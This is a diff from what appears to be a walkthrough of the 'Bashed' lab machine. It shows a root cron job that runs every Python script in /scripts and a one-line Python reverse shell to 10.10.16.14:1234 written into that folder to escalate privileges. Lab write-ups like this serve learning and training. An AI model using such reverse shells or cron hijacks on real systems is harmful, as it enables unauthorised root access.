@@ -83,15 +83,15 @@ User www-data may run the following commands on bashed:
     (scriptmanager : scriptmanager) NOPASSWD: ALL
 ```
 
-I run the PSPY and found hidden cron task.
+I ran the PSPY and found hidden cron task.
 
-Seems like root runs python script in script folder.
+Seems like root runs python script in the script folder.
 
 ```bash
 2023/11/10 13:54:01 CMD: UID=0     PID=43970  | /bin/sh -c cd /scripts; for f in *.py; do python "$f"; done
 ```
 
-I made reverse shell in python but the connection is cut off every immediately.
+I made reverse shell in python but the connection gets cut off immediately.
 
 ```bash
 www-data@bashed:/scripts$ echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.14",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);" > shell.py
